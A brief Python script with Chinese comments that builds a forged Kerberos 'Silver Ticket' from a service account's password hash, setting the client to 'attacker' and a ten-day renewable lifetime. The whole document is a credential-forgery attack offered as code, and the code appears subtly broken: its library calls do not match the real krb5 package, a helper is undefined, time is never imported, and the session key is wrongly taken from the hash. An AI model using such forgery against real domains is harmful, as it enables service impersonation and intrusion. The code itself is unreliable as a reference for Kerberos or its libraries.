from krb5 import * #import python-krb5套件

def generate_silver_ticket(service_account):
    # 獲取目標服務帳戶密碼雜湊
    service_account_password_hash = get_service_account_password_hash(service_account)
    
    # 生成Silver Ticket
    ticket = krb5_ticket.Ticket()
    ticket.set_encryption_type(EncryptionType.AES256_CTS_HMAC_SHA1_96) # 設置加密類型
    ticket.set_authtime(int(time.time())) # 設置授權時間
    ticket.set_starttime(int(time.time())) # 設置起始時間
    ticket.set_endtime(int(time.time() + 864000)) # 設置結束時間
    ticket.set_renew_until(int(time.time() + 864000)) # 設置可續訂時間
    ticket.set_flags(TicketFlag.RENEWABLE) # 設置標誌位
    ticket.set_client("attacker") # 設置client
    ticket.set_server(service_account) # 設置server
    ticket.set_session_key(krb5_crypto.Key(EncryptionType.AES256_CTS_HMAC_SHA1_96, service_account_password_hash[:32])) # 設置session key
    
    # 返回Silver Ticket
    return ticket